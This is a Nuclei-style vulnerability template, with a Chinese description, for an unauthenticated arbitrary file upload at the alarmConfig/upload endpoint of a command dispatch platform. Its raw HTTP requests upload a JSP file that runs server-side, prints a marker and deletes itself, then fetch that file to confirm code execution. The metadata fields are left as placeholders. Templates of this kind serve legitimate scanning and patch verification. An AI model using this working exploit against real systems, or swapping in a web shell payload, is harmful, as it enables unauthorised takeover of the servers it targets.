id: kshrhzh-alarmConfig-upload
info:
  name: Template Name
  author: apple
  severity: critical
  description: 可视化融合指挥调度平台 alarmConfig接口处存在任意文件上传漏洞，未经身份验证的攻击者可利用此漏洞上传恶意后门文件，导致服务器权限被控。
  reference:
    - https://
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
http:
  - raw:
      - |-
        POST /dispatch/alarm/alarmConfig/upload HTTP/1.1
        Upgrade-Insecure-Requests: 1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
        Content-Length: 163

        ------WebKitFormBoundary7ctER307B0RaQwOp
        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"

        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary7ctER307B0RaQwOp--
      - |
        GET /media/temporaryFiles/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
    matchers:
      - type: word
        part: body
        words:
          - 'e165421110ba03099a1c0393373c5b43'
